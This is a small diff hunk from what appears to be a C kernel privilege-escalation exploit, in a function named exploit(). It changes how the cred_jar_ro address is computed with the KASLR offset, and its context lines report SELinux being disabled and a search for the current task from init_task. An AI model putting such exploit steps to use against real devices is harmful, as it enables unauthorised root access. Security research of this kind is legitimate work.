@@ -1020,7 +1020,7 @@ void exploit(void) {
   printf("selinux disabled\n");
 
   unsigned long *mem = malloc(0x1000);
-  cred_jar_ro = kaslr_offset + 0xffffffc0122c4cd0;
+  cred_jar_ro += kaslr_offset;
 
   printf("looking for my process...\n");
   unsigned long current_task = init_task;
